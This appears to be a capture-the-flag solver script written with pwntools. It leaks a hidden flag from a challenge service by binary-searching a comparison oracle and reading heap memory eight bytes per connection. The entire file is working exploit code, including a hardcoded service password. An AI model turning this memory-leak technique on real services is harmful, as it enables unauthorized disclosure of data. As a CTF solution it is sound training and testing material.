import os

from pwn import context, remote, rol, ror

context.log_level = "info"

HOST = os.environ.get("SERVICE_MINMAX_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_MINMAX_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/exploit.py (author-provided).
#
# The service hides a secret 8-byte value among a player-supplied array
# of numbers and reports only whether a requested position holds the
# current MAX (via "<i+1>." prefix) or not, after the player submits a
# value to compare against it. By repeatedly overwriting the slot right
# before the hidden one with a binary-searched midpoint and checking
# whether it still reports as the max, each 8-byte memory word at a
# fixed offset past the sentinel can be recovered bit-by-bit (bytewise
# via int64 comparisons) -- a classic comparison-oracle memory leak, one
# 8-byte word per full reconnect. The loop keeps leaking consecutive
# words (reconnecting each time, since each connection's heap layout
# gives the next word at the same relative offset) until the flag's
# closing '}' appears in the leaked bytes.


def i2b(i):
    return str(i).encode()


def get_conn():
    return remote(HOST, PORT)


def binary_search(p, i):
    p.sendlineafter(b"> ", b"4919")
    p.sendlineafter(b"password: ", b"h@cK3R/")

    l, r = -(2**63), 2**63 - 1
    nums = [i2b(l) for _ in range(i)] + [b"-"] + [b"0"]
    while True:
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"> ", i2b(i + 2))
        p.sendlineafter(b"> ", b"max")
        m = (l + r) >> 1
        if l > r:
            p.sendlineafter(b"numbers: ", b" ".join(nums))
            break
        nums[-1] = i2b(m)
        p.sendlineafter(b"numbers: ", b" ".join(nums))
        res = p.recvline()
        if res.startswith(i2b(i + 1) + b"."):
            l = m + 1
        else:
            r = m - 1

    if m < 0:
        m += 2**64
    return int.to_bytes(m, 8, "little")


def main():
    i = 0
    flag = b""
    started = False
    p = get_conn()
    while True:
        res = binary_search(p, i)
        if started or b"SCC{" in res:
            flag += res
            started = True

        p.close()
        if started and b"}" in res:
            break

        p = get_conn()
        i += 1

    print(flag.decode(errors="replace"))


if __name__ == "__main__":
    main()
